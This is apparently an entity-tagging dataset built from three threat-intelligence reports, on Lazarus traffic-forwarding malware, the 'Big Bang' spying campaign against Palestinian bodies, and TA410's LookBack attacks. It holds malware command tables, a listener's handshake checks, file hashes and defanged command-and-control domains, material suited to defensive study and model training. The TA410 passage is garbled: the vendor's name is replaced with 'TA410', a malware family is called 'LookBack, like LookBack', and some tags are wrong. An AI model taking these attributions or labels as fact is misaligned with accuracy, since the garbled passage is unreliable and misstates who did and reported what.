Group-IB_Lazarus,", size: 
315904 bytes) executable programs are ",O
Group-IB_Lazarus,Server_TrafficForwarder,malware
Group-IB_Lazarus,".

On infected proxies, these programs always were child processes of 
",O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus," and were located in %windows%.

Description

The file is a resident application that, once launched, waits for incoming 
connections on a specific port to provide further control of the PC to the 
attacker.

",O
Group-IB_Lazarus,Server_TrafficForwarder,malware
Group-IB_Lazarus," uses the wolfSSL staticly linked library to 
implement asymmetric encryption of traffic between the client and the 
server.



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution43

Keys

It has two related files:

The “",O
Group-IB_Lazarus,wcer.dat,ioc
Group-IB_Lazarus,"” file (size: 4382 bytes, md5: ",O
Group-IB_Lazarus,E39C8A1B2D35EC1B7BF73599EA4A33FA,ioc
Group-IB_Lazarus,") is a certificate file:

The “",O
Group-IB_Lazarus,wkey.dat,ioc
Group-IB_Lazarus,"” file (size: 1675 bytes, md5: ",O
Group-IB_Lazarus,F329B8A6957635C8CCA1C97FA459DC82,ioc
Group-IB_Lazarus,") is a private key file

The related files are used to encrypt network traffic and verify the client.

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution44

Information about the C&C server or addresses of clients is not available 
in the file. The sample just waits for incoming connections to the selected 
port. 

Main functionality

• Parses the command line arguments 
Example: """,O
Group-IB_Lazarus,msvmgr.exe,ioc
Group-IB_Lazarus, 4444 ,O
Group-IB_Lazarus,111.222.111.222,ioc
Group-IB_Lazarus," 31337"" 

The sample must be run with the following arguments:

",O
Group-IB_Lazarus,msvmgr.exe,ioc
Group-IB_Lazarus," port ip1 port2

where port is a port used to wait for incoming connections

ip1 - an IP address of Layer 2 server to which it is required to connect

port2 – a port of the Layer 2 server, to which it is required to connect to redirect 
traffic

Based on the above-mentioned information, in the event the second command 
line argument (IP address) is specified, then after establishing connection with the 
client, the sample will connect to the network node from the second argument 
(for the above-mentioned example this will be """,O
Group-IB_Lazarus,111.222.111.222,ioc
Group-IB_Lazarus,""") to the port from 
the third argument (31337 in the example). This server will be used to proxy traffic 
from the client. If the command-line arguments are not specified, the remote 
client will accept incoming connections, but will not tunnel the traffic, because it 
will not be able to establish an outgoing connection with the next node (it is not 
specified) and run two threads to redirect traffic. 

• After the start, it reads the contents of the key and certificate file 
from the current directory.

• It binds the port from the arguments; if the arguments do not 
contain a port — it listens on a random port and waits for incoming 
connections

Supported functionality:

• performs network communications over an encrypted protocol

• self-removal

• reads and sends system information: about PC components, locales, 
free space on disks, RAM size, network adapters and local interfaces, 
OS version, ",O
Group-IB_Lazarus,Windows,software
Group-IB_Lazarus," version identifier, PC name



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution45

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution46

• can read and send the contents of the private key file

• checks the validity of client’s responses (checking if this is a legitimate 
client). After first network request program gets the response from the 
client, decrypts and compares it with a previously known response. In the 
event he gets a different response - it drops the connection.

Below is the table of all available commands:

Table 1

Command Description

0x1095 -

0x1096 Collects and sends system information

0x10AA Gets the configuration

0x10AB Changes the configuration (including the port on which it listens for 
connections)

0x10AE -

0x10AF -

0x10B3 Reads a private key file and sends it to the operator

0x10B4 Writes data to a file



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution47

",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists have detected several versions of the file. They differ in 
the list of available commands. Another version of the malicious file has the 
following command list:

Table 2 

",O
Group-IB_Lazarus,Backend_Listener,malware
Group-IB_Lazarus,"

An executable file “",O
Group-IB_Lazarus,msdtc.exe,ioc
Group-IB_Lazarus,” (MD5: ,O
Group-IB_Lazarus,5C1917F6753D03A08328132DB1E06571,ioc
Group-IB_Lazarus,", 
size: 257 536 bytes) can be classified as ",O
Group-IB_Lazarus,Backend_Listener,malware
Group-IB_Lazarus,".

It is a service application waiting for incoming connections on two ports. It 
can redirect traffic from one port to another, thereby implementing a tunnel 
between the client connected to the second port and the client connected to 
the first one and vise versa.

Description

Once launched, the application extracts two arguments from the command 
line. These are port numbers on which the application will wait for incoming 
connections.

Command Description

NONE -

GINF Collects and sends system information about the PC

GCFG Gets configuration

SCFG Changes the configuration (including the port on which it listens connections)

SLEP -

HIBN -

LCLR Records data to the file

LDWN Reads a private key file and sends it to the operator

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution48

To encrypt traffic, an open source library named wolfSSL is used. After the 
application is started, the private key and certificate files will be extracted 
from the current directory. They are used to encrypt traffic between the 
server and connected clients that must have identical key pairs. Without them, 
you can not connect to the service, or decrypt its traffic.

The program opens two ports and waits for incoming connections from 
the operator on one of them. The first port is port1 from the command-line 
arguments. Port2 is the second argument. In our study, the first port was port 
8080, the second one was port 9090.



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution49

In order to trigger traffic from one port to another, the operator performs 
a connection to the server (server is the current sample, because it is just a 
service waiting for incoming connections) on port2 (9090).

Only an operator can connect to the server to control traffic because the 
service uses a private and public key pair to authorize and encrypt traffic (and 
this key pair must be identical to the one that the client-operator will use). In 
the event of absence of a key pair, or with a different pair of keys, the service 
will drop connections.

To establish a successful connection, several checks will be performed. In 
addition, traffic is encrypted with a reversible algorithm.

Response data from the server is partially randomized. Probably, this 
is intended to randomize the length of outgoing packets, so that traffic 
generated by the server alters, which complicates its detection.

If all the legitimacy tests of the operator’s commands are passed, two traffic 
threads from one port to another will be triggered.

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution50

Following this, when the client connects to the first port (8080), the service 
will forward traffic from the first port to the second one and back.

If there are no active connections on the first port, the server issues the 
""PELS"" command to the client connected to the second port.

To reverse-engineer the protocol of server communications with 
connected clients, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists have developed a client that 
successfully connects to both ports of the server. Its code was created 
based on the server’s requests and responses as well as using the open 
source library wolfSSL.



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution51

To connect to the server in order to tunnel traffic, the operator should use 
",O
Group-IB_Lazarus,Admin_Tool,malware
Group-IB_Lazarus," designed to control the infrastructure:

1. ",O
Group-IB_Lazarus,Admin_Tool,malware
Group-IB_Lazarus," must have a key pair identical to the server

2. It sends a customized Hello-packet that differs from the one that is 
provided by the library.  
 
By default this packet (msg) is specified as follows in the library: 
  

The correct Hello packet that will be accepted by ",O
Group-IB_Lazarus,Backend_Listener,malware
Group-IB_Lazarus," must be of the 
following form:

 
In fact, this is an information packet, rather than a Hello packet, and its first 
byte contains the length of the next packet sent («len»), while the rest bytes 
must be zero in this case. 

3.    ",O
Group-IB_Lazarus,Admin_Tool,malware
Group-IB_Lazarus," sends an encrypted (special) packet with a length from the 
previous packet (len).

4.   The server decrypts the contents of the packet sent and, after decryption, 
the following conditions must be true: 

(DWORD)&decrypted_buff[5] == len

(DWORD)&decrypted_buff[15] == len 

where len is the length of the packet

 

5.    ",O
Group-IB_Lazarus,Admin_Tool,malware
Group-IB_Lazarus, sends DWORD with len2 ,O
Group-IB_Lazarus,<,O
Group-IB_Lazarus," 201 where len2 is the length of the 
next packet 

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution52

6.    ",O
Group-IB_Lazarus,Admin_Tool,malware
Group-IB_Lazarus," sends the encrypted (special) second packet with the length 
received in the previous packet 

7.    The server decrypts the contents of the packet sent, and after decryption, 
the following conditions must be true: 

(DWORD)&decrypted_buff[4] == 0xD1CC8594

(DWORD)&decrypted_buff[8] == 3



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution53

Preventing  
and investigating 
cybercrime ",O
Group-IB_Lazarus,since 2003,timestamp
Group-IB_Lazarus,"

www.group-ib.com

blog.group-ib.com

info@group-ib.com

+7 495 984 33 64

twitter.com/groupib_gib

linkedin.com/company/group-ib",O
apt-attack-middle-east-big-bang,"CHECKPOINT.COM

PUBLICATIONS TOOLS ABOUT US CONTACT US

SUBSCRIBE

",O
apt-attack-middle-east-big-bang,APT,threat_actor
apt-attack-middle-east-big-bang, Attack In the ,O
apt-attack-middle-east-big-bang,Middle East,country
apt-attack-middle-east-big-bang,: ,O
apt-attack-middle-east-big-bang,The Big Bang,campaign
apt-attack-middle-east-big-bang,"
",O
apt-attack-middle-east-big-bang,"July 8, 2018",timestamp
apt-attack-middle-east-big-bang,"

",O
apt-attack-middle-east-big-bang,Over the last few weeks,timestamp
apt-attack-middle-east-big-bang,", the ",O
apt-attack-middle-east-big-bang,Check Point Threat Intelligence Team,org
apt-attack-middle-east-big-bang, discovered the comeback of an ,O
apt-attack-middle-east-big-bang,APT,threat_actor
apt-attack-middle-east-big-bang,"

surveillance attack against institutions across the ",O
apt-attack-middle-east-big-bang,Middle East,country
apt-attack-middle-east-big-bang,", specifically the ",O
apt-attack-middle-east-big-bang,Palestinian Authority,org
apt-attack-middle-east-big-bang,".

The attack begins with a phishing email sent to targets that includes an attachment of a self-extracting

archive containing two files: a ",O
apt-attack-middle-east-big-bang,Word,software
apt-attack-middle-east-big-bang," document and a malicious executable. Posing to be from the

",O
apt-attack-middle-east-big-bang,Palestinian Political and National Guidance Commission,org
apt-attack-middle-east-big-bang,", the ",O
apt-attack-middle-east-big-bang,Word,software
apt-attack-middle-east-big-bang," document serves as a decoy,

distracting victims while the malware is installed in the background.

Search IPS Protections, Malware Families, Applications and more...

https://www.checkpoint.com/
https://www.facebook.com/checkpointsoftware
https://plus.google.com/+checkpoint/posts
https://www.linkedin.com/company/check-point-software-technologies
mailto:?to=&subject=Research.CheckPoint.com&body=Checkout%20the%20latest%20research%20on%20Research.CheckPoint.com!
https://research.checkpoint.com/feed
https://twitter.com/checkpointsw
https://research.checkpoint.com/
https://research.checkpoint.com/category/threat-research/
https://research.checkpoint.com/about-us/
https://research.checkpoint.com/contact/
https://research.checkpoint.com/subscription/
https://www.checkpoint.com/support-services/threatcloud-incident-response/


The malware has several modules, some of which are:

Taking a screenshot of the infected machine and sending it to the C&C server.

Sending a list of documents with file extensions including .doc, .odt, .xls, .ppt, .pdf and more.

Logging details about the system.

Rebooting the system.

Self-destructing the executable.

While it is not clear exactly what the attacker is looking for, what is clear is that once he finds it, a second

stage of the attack awaits, fetching additional modules and/or malware from the Command and Control

server. This then is a surveillance attack in progress and has been dubbed ‘",O
apt-attack-middle-east-big-bang,Big Bang,campaign
apt-attack-middle-east-big-bang,"’ due to the

attacker’s fondness for the ‘Big Bang Theory’ TV show, after which some of the malware’s modules are

named.

A previous campaign of this ",O
apt-attack-middle-east-big-bang,APT group,threat_actor
apt-attack-middle-east-big-bang, was uncovered by ,O
apt-attack-middle-east-big-bang,Talos,org
apt-attack-middle-east-big-bang, in ,O
apt-attack-middle-east-big-bang,June 2017,timestamp
apt-attack-middle-east-big-bang,", and since then very little of

this operation was seen in the wild. The ",O
apt-attack-middle-east-big-bang,Big Bang,campaign
apt-attack-middle-east-big-bang," campaign described below incorporates improved

capabilities and offensive infrastructure, and seems to be even more targeted.

 

What’s New in ",O
apt-attack-middle-east-big-bang,Ramallah,country
apt-attack-middle-east-big-bang,"?

The first instances of the current campaign began to appear ",O
apt-attack-middle-east-big-bang,in the middle of April this year,timestamp
apt-attack-middle-east-big-bang,". But, thanks to

the attackers known affection for decoy documents that pose as news summaries, we were able to date

the campaign back to ",O
apt-attack-middle-east-big-bang,March 2018,timestamp
apt-attack-middle-east-big-bang,".

This campaign, as well as those in its previous form, uses phishing methods to deliver its reconnaissance

stage malware. But unlike in ",O
apt-attack-middle-east-big-bang,2017,timestamp
apt-attack-middle-east-big-bang,", this time the malicious attachment is an executable which is actually a

self-extracting archive, containing a decoy document and the malware itself. It is almost superfluous to

mention that in order to give the file a legitimate look, the developers pinned it to a ",O
apt-attack-middle-east-big-bang,Word,software
apt-attack-middle-east-big-bang," icon and called

it “ا������ ا����� ا����ي” (Monthly Press Report).

When this file is double clicked, it opens a ",O
apt-attack-middle-east-big-bang,Word,software
apt-attack-middle-east-big-bang, document with the logo of the ,O
apt-attack-middle-east-big-bang,Palestinian Political and National Guidance Commission,org
apt-attack-middle-east-big-bang,". This document pretends to be a press report and contains news

headlines that were actually copied from various Palestinian news websites.

While the victim is distracted with the legitimate looking ",O
apt-attack-middle-east-big-bang,Word,software
apt-attack-middle-east-big-bang," document, an additional executable which

is archived alongside the decoy document is installed in the background.

https://blog.talosintelligence.com/2017/06/palestine-delphi.html


Figure 1: Screenshot of ",O
apt-attack-middle-east-big-bang,Word,software
apt-attack-middle-east-big-bang," Document.

Although the archive was found on ",O
apt-attack-middle-east-big-bang,mid-April,timestamp
apt-attack-middle-east-big-bang,", the ",O
apt-attack-middle-east-big-bang,Word,software
apt-attack-middle-east-big-bang, document shows that it was last edited on ,O
apt-attack-middle-east-big-bang,"March 29 , 2018",timestamp
apt-attack-middle-east-big-bang,". This date is also mentioned in the document’s body and used as its title, “",O
apt-attack-middle-east-big-bang,29-3.doc,ioc
apt-attack-middle-east-big-bang,"”. The

metadata in the document shows that it was also titled “���� دة ا����� /���م أ�����”, which happens to be the
name of the ",O
apt-attack-middle-east-big-bang,Guidance Commission Office,org
apt-attack-middle-east-big-bang,"’s Chief Executive:

th

https://research.checkpoint.com/wp-content/uploads/2018/07/Fig-1.png
https://research.checkpoint.com/wp-content/uploads/2018/07/Fig-2.png


The naming convention and content of the file may indicate an attacker’s familiarity with the nature of the

victim.

 

Analysis

While the analysis below discloses the capabilities of the spotted malware, we are pretty sure it is part of

a multi-staged attack that targets very specific victims. The malware below is part of the reconnaissance

stage and should lead to the main course, whose nature is still unknown.

As for the malware’s language, ",O
apt-attack-middle-east-big-bang,during the 2017,timestamp
apt-attack-middle-east-big-bang," campaign the group used a fairly unsophisticated

malware, dubbed “",O
apt-attack-middle-east-big-bang,Micropsia,malware
apt-attack-middle-east-big-bang,"”, written in ",O
apt-attack-middle-east-big-bang,C++,software
apt-attack-middle-east-big-bang, and wrapped in ,O
apt-attack-middle-east-big-bang,Delphi,software
apt-attack-middle-east-big-bang,". In this year’s campaign, the

attackers use an upgraded variant of this malware, still written in ",O
apt-attack-middle-east-big-bang,C++,software
apt-attack-middle-east-big-bang," but wrapped as a self-extracting

executable.

 

The Executable

The executable contained in the archive is called “",O
apt-attack-middle-east-big-bang,DriverInstallerU.exe,ioc
apt-attack-middle-east-big-bang,"” but its metadata shows that its

original name is “",O
apt-attack-middle-east-big-bang,Interenet Assistant.exe,ioc
apt-attack-middle-east-big-bang,"”.

Once it is executed, the malware ensures its persistence by setting a mutex (“InterenetAssistantN”),

copying itself to the “ProgramData” directory, and adding itself to the scheduled tasks.

Once secured, the malware communicates, by default, with a primary hardcoded command and control

website that varies in different samples (",O
apt-attack-middle-east-big-bang,spgbotup[.]club,ioc
apt-attack-middle-east-big-bang,). The ,O
apt-attack-middle-east-big-bang,APT,threat_actor
apt-attack-middle-east-big-bang," actors, hardcoded additional backup

C&C website (",O
apt-attack-middle-east-big-bang,lindamullins[.]info,ioc
apt-attack-middle-east-big-bang,") that is contacted in case the malware does not get a response from the

first website. This is likely to be a mechanism that the threat actors implemented in order to handle

cases in which they would have to go through infrastructure changes.

Figure 3: Hardcoded 2 command and Control Websites.

https://research.checkpoint.com/wp-content/uploads/2018/07/Fig-3.png


Once the sample is able to reach the main C&C, the first thing it does is fingerprint the system (user and

PC names, OS version and AntiVirus engines), and exfiltrate the gathered information.

Figure 4: Initial Beacon.

Following this, a POST request is sent to the C&C every once in a while

(/api/serv/requests/[base64_fingerprint]), and in turn, the C&C sends back a configuration file that turns

on specific functionalities of the malware.

 

 

 

Figure 5: C&C Commands

What is interesting is that each key in this configuration file represents a different module in the

executable, and when the key is marked as true the executable will run the relevant module’s content. In

addition, the names of those modules are taken from the popular sitcom, ‘The Big Bang Theory’, in

addition to actors’ names from the popular Turkish TV series ‘Resurrection: Ertugrul’ (",O
apt-attack-middle-east-big-bang,Celal Al,identity
apt-attack-middle-east-big-bang,", ",O
apt-attack-middle-east-big-bang,Sonmez,identity
apt-attack-middle-east-big-bang,"
and ",O
apt-attack-middle-east-big-bang,Gokhan,identity
apt-attack-middle-east-big-bang,").

In the configuration file we found thirteen keys for thirteen different modules. However, in our samples

we could find only five corresponding modules. This could mean that this campaign is evolving and that

there will likely be more samples in the future that will implement the missing parts.

The following table describes the role of each module:

Module Name Purpose

",O
apt-attack-middle-east-big-bang,Penny,malware
apt-attack-middle-east-big-bang," Takes a screenshot of the infected machine and sends it to the server

",O
apt-attack-middle-east-big-bang,Wolowitz_Helberg,malware
apt-attack-middle-east-big-bang,"
Enumerates running processes, saves their names and their IDs in

“",O
apt-attack-middle-east-big-bang,sat.txt,ioc
apt-attack-middle-east-big-bang,"” and sends the file to the server

https://research.checkpoint.com/wp-content/uploads/2018/07/Fig-4.png


",O
apt-attack-middle-east-big-bang,Celal_Al,malware
apt-attack-middle-east-big-bang," Sends a list of documents with certain extensions. The extensions are:

doc, docx, odt, xls, xlsx, ppt, pptx, accdb, accde, mdb, pdf, csv

",O
apt-attack-middle-east-big-bang,Runfile,malware
apt-attack-middle-east-big-bang," Runs a file, receives a process name and a file type from the server

",O
apt-attack-middle-east-big-bang,Nayyar_Sonmez,malware
apt-attack-middle-east-big-bang,"
Downloads a file with a ‘.txt’ extension from a given URL, changes the

extension to ‘.exe’ and runs it

",O
apt-attack-middle-east-big-bang,Koothrappali,malware
apt-attack-middle-east-big-bang," Logs details about the system and sends them to the server

",O
apt-attack-middle-east-big-bang,Bialik_Gokhan,malware
apt-attack-middle-east-big-bang," Reboots the system

",O
apt-attack-middle-east-big-bang,Hofstadter,malware
apt-attack-middle-east-big-bang," Terminates a process by name

",O
apt-attack-middle-east-big-bang,Parsons_Sheldon,malware
apt-attack-middle-east-big-bang," Deletes the payload from the startup folder and deletes the actual file

",O
apt-attack-middle-east-big-bang,Reshad_Strik,malware
apt-attack-middle-east-big-bang," Sends a list of the partitions found on the infected machine

",O
apt-attack-middle-east-big-bang,Pinar8,malware
apt-attack-middle-east-big-bang," No such module in our sample

",O
apt-attack-middle-east-big-bang,Mehmet7,malware
apt-attack-middle-east-big-bang," No such module in our sample

",O
apt-attack-middle-east-big-bang,Bahar6,malware
apt-attack-middle-east-big-bang," No such module in our sample

It is important to note that unlike ",O
apt-attack-middle-east-big-bang,RATs,malware
apt-attack-middle-east-big-bang," that try to keylog the infected system and harvest credentials, this

sample shows the irregular behavior of looking for ",O
apt-attack-middle-east-big-bang,Microsoft Office,software
apt-attack-middle-east-big-bang," documents on the victim’s machine,

or enumerating partitions. In addition, the file has the capability of downloading and running another

executable

After reviewing all the malware functionalities, we are confident in saying that the attackers look for

victims who answer well-defined characteristics and believe that further stages of the attack are

delivered only to those who fit the specific victim profile.

 

The Attacker’s English Level

The typo in the file’s name (",O
apt-attack-middle-east-big-bang,Interenet Assistant,ioc
apt-attack-middle-east-big-bang,") helped us find another executable with the same name

that is almost identical to the original one. In addition, using the communication pattern we were able to

find another sample called “",O
apt-attack-middle-east-big-bang,DriverInstallerU,ioc
apt-attack-middle-east-big-bang,"”. In this sample, however, the module names were changed

from actors and characters’ names to car models, namely “",O
apt-attack-middle-east-big-bang,BMW_x1,malware
apt-attack-middle-east-big-bang,"”, “",O
apt-attack-middle-east-big-bang,BMW_x2,malware
apt-attack-middle-east-big-bang,” and up to “,O
apt-attack-middle-east-big-bang,BMW_x8,malware
apt-attack-middle-east-big-bang,"”.

But typos are not the only English mistakes of this ",O
apt-attack-middle-east-big-bang,APT group,threat_actor
apt-attack-middle-east-big-bang,". Incorrect grammar phrases in the C2

websites also assisted in uncovering the operation infrastructure.



Unlike what is generally expected from a C&C, browsing the websites actually returns the following

response:

Websites related to this campaign use readymade bootstrap templates, but include unique and

grammatically incorrect strings such as “Probably the most Music Site in the world!”, and

“",O
apt-attack-middle-east-big-bang,contact@namylufy[.]com,ioc
apt-attack-middle-east-big-bang,"” in some of the websites.

Those strings helped us find other websites that use the same template, and while they could not be

linked to specific malware samples, it is possible that they will be used in the future.

 

Looking Back

https://research.checkpoint.com/wp-content/uploads/2018/07/Fig-6.png
mailto:contact@namylufy[.]com
https://research.checkpoint.com/wp-content/uploads/2018/07/Fig-7.png


While the ",O
apt-attack-middle-east-big-bang,APT,threat_actor
apt-attack-middle-east-big-bang, has gone through significant upgrades ,O
apt-attack-middle-east-big-bang,over the past year,timestamp
apt-attack-middle-east-big-bang,", the conductors of these

campaigns maintained evident fingerprints, both in the delivery methods and malware development

conventions. These unique traces assisted us in correlating the current wave to past attacks, and may

also have some resemblance to attacks related to the ",O
apt-attack-middle-east-big-bang,Gaza Cybergang,threat_actor
apt-attack-middle-east-big-bang, ,O
apt-attack-middle-east-big-bang,APT group,threat_actor
apt-attack-middle-east-big-bang,".

During our investigation we spotted three instances of the renewed operation, but unique artifacts in the

command and control website revealed a wider infrastructure that may well manage more unknown

samples.

In addition, the concept of using self-extracting archives and decoy documents is not groundbreaking or

new, as we have seen similar attacks being carried in the past by the ",O
apt-attack-middle-east-big-bang,Gaza Cybergang,threat_actor
apt-attack-middle-east-big-bang, ,O
apt-attack-middle-east-big-bang,APT group,threat_actor
apt-attack-middle-east-big-bang,".

There were, however, many similarities between the samples we found and the ones which were found

",O
apt-attack-middle-east-big-bang,during the 2017,timestamp
apt-attack-middle-east-big-bang," campaign, such as the usage of actor and character names from renowned TV series, as

well as fingerprinting the system and sending the information to the C&C. According to ",O
apt-attack-middle-east-big-bang,Talos,org
apt-attack-middle-east-big-bang,", those files

were distributed to victims in the Palestinian law enforcement agencies ",O
apt-attack-middle-east-big-bang,during 2017,timestamp
apt-attack-middle-east-big-bang,".

However, in ",O
apt-attack-middle-east-big-bang,2017,timestamp
apt-attack-middle-east-big-bang," the group used an executable wrapped in Delphi, whereas the sample we found uses a

self-extracting archive. Both of the above open a document as well as another executable (written in ",O
apt-attack-middle-east-big-bang,C++,software
apt-attack-middle-east-big-bang,")

when they are double clicked.

Finally, the C&C communication has also been improved in the recent campaign, as backup domains did

not appear in the old ones. In addition, the newer malware strain has stronger capabilities and a wider

functionality than the older one, which would only send information about the system version.

 

Conclusion

With the experience gained from the ",O
apt-attack-middle-east-big-bang,APT,threat_actor
apt-attack-middle-east-big-bang, attack that began in ,O
apt-attack-middle-east-big-bang,March 2017,timestamp
apt-attack-middle-east-big-bang,", it seems this campaign has

evolved into an attack with new capabilities, and an even more specific target, ",O
apt-attack-middle-east-big-bang,over a year later,timestamp
apt-attack-middle-east-big-bang,".

Although the group behind it seems to be focused on carefully selecting their victims, using a custom-

made info-stealer for intelligence gathering operations, due to its very nature it is difficult to assert what

the ultimate goal of this campaign is. Indeed, the next stages of the attack may even still be in the works,

not yet deployed or only deployed to selected few victims.

In addition, although the clear fingerprints of the perpetrators leave no doubt we are witnessing the

comeback of the same ",O
apt-attack-middle-east-big-bang,APT,threat_actor
apt-attack-middle-east-big-bang,", it is still not yet confirmed exactly who the threat group behind this campaign

actually is. As no concrete attribution has yet been made, due to the shared interests and malware

features of both ",O
apt-attack-middle-east-big-bang,2017,timestamp
apt-attack-middle-east-big-bang, and ,O
apt-attack-middle-east-big-bang,2018,timestamp
apt-attack-middle-east-big-bang," campaigns, the ",O
apt-attack-middle-east-big-bang,Gaza Cybergang,threat_actor
apt-attack-middle-east-big-bang," may be a good starting point for further

research.



PUBLICATIONS

G O C C O S

TOOLS
SANDBLAST FILE ANALYSIS

URL CATEGORIZATION

INSTANT SECURITY ASSESSMENT

LIVE THREAT MAP

 

Indicators of Compromise

",O
apt-attack-middle-east-big-bang,a210ac6ea0406d81fa5682e86997be25c73e9d1b,ioc
apt-attack-middle-east-big-bang,"

",O
apt-attack-middle-east-big-bang,994ebbe444183e0d67b13f91d75b0f9bcfb011db,ioc
apt-attack-middle-east-big-bang,"

",O
apt-attack-middle-east-big-bang,74ea60b4e269817168e107bdccc42b3a1193c1e6,ioc
apt-attack-middle-east-big-bang,"

",O
apt-attack-middle-east-big-bang,511bec782be41e85a013cbea95725d5807e3c2f2,ioc
apt-attack-middle-east-big-bang,"

",O
apt-attack-middle-east-big-bang,9e093a5b34c4e5dea59e374b409173565dc3b05b,ioc
apt-attack-middle-east-big-bang,"

 

",O
apt-attack-middle-east-big-bang,lindamullins[.]info,ioc
apt-attack-middle-east-big-bang,"

",O
apt-attack-middle-east-big-bang,spgbotup[.]club,ioc
apt-attack-middle-east-big-bang,"

",O
apt-attack-middle-east-big-bang,namyyeatop[.]club,ioc
apt-attack-middle-east-big-bang,"

",O
apt-attack-middle-east-big-bang,namybotter[.]info,ioc
apt-attack-middle-east-big-bang,"

",O
apt-attack-middle-east-big-bang,sanjynono[.]website,ioc
apt-attack-middle-east-big-bang,"

",O
apt-attack-middle-east-big-bang,exvsnomy[.]club,ioc
apt-attack-middle-east-big-bang,"

",O
apt-attack-middle-east-big-bang,ezofiezo[.]website,ioc
apt-attack-middle-east-big-bang,"

",O
apt-attack-middle-east-big-bang,hitmesanjjoy[.]pro,ioc
apt-attack-middle-east-big-bang,"

 

 

https://research.checkpoint.com/category/threat-intelligence-reports/
https://threatemulation.checkpoint.com/
https://www.checkpoint.com/urlcat/
https://www.cpcheckme.com/checkme/
https://threatmap.checkpoint.com/ThreatPortal/livemap.html


×

Subscribe to Cyber Intelligence Reports for the most current news and insights.

GLOBAL CYBER ATTACK REPORTS

RESEARCH PUBLICATIONS

INCIDENT RESPONSE

IPS ADVISORIES

",O
apt-attack-middle-east-big-bang,CHECK POINT,org
apt-attack-middle-east-big-bang," BLOG

DEMOS

ABOUT US CONTACT US

SUBSCRIBE

© ",O
apt-attack-middle-east-big-bang,1994-2018,timestamp
apt-attack-middle-east-big-bang, ,O
apt-attack-middle-east-big-bang,Check Point Software Technologies,org
apt-attack-middle-east-big-bang," LTD. All rights reserved.  

Propery of checkpoint.com | Privacy Policy

https://research.checkpoint.com/category/threat-intelligence-reports/
https://research.checkpoint.com/category/threat-research/
https://research.checkpoint.com/category/incident-response/
https://www.checkpoint.com/advisories/
https://blog.checkpoint.com/
https://research.checkpoint.com/category/demos/
https://research.checkpoint.com/about-us/
https://research.checkpoint.com/contact/
https://research.checkpoint.com/subscription/
https://www.checkpoint.com/
https://research.checkpoint.com/privacy-policy/",O
TA410,"8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 1/20

",O
TA410,"June 5, 2020",timestamp
TA410,"

",O
TA410,TA410,threat_actor
TA410,: The Group Behind,O
TA410,LookBack,campaign
TA410," Attacks Against
U.S. Utilities Sector Returns with New Malware

",O
TA410,TA410,org
TA410,".com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new

Blog
Threat Insight
",O
TA410,TA410,threat_actor
TA410,: The Group Behind,O
TA410,LookBack,campaign
TA410, Attacks Against ,O
TA410,U.S.,country
TA410, ,O
TA410,Utilities Sector,industry
TA410," Returns with
New Malware

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new?utm_source=dlvr.it&utm_medium=twitter
https://www.proofpoint.com/us
https://www.proofpoint.com/us/blog
https://www.proofpoint.com/us/blog/threat-insight


8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 2/20

",industry
TA410,"June 08, 2020",timestamp
TA410, ,O
TA410,Michael Raggi,identity
TA410,", ",O
TA410,Dennis Schwarz,identity
TA410,", and ",O
TA410,Georgi Mladenov,identity
TA410, with the,O
TA410,TA410,org
TA410,"
Threat Research Team

In ",O
TA410,August 2019,timestamp
TA410,",",O
TA410,TA410,org
TA410, researchers reported that,O
TA410,LookBack,campaign
TA410," malware was targeting
the ",O
TA410,United States,country
TA410, (,O
TA410,U.S.,country
TA410,) utilities sector between ,O
TA410,July and August 2019,timestamp
TA410,". We then continued
our analysis into additional",O
TA410,LookBack,campaign
TA410, campaigns that unfolded between ,O
TA410,"August 21-29,
2019",timestamp
TA410,". These campaigns utilized malicious macro-laden documents in order to deliver
modular malware to targeted utility providers across the ",O
TA410,U.S.,country
TA410," At the same time as the
",O
TA410,LookBack,campaign
TA410," campaigns,",O
TA410,TA410,org
TA410," researchers identified a new, additional malware family
named",O
TA410,LookBack,campaign
TA410, that was also being delivered to ,O
TA410,U.S.,country
TA410," utilities providers.

",O
TA410,LookBack,campaign
TA410," malware, like",O
TA410,LookBack,campaign
TA410,", gives attackers complete control over a compromised
system. Its remote access trojan (RAT) functionality includes the ability to access
installed applications, the keyboard, mouse, screen, files, services, and processes with the
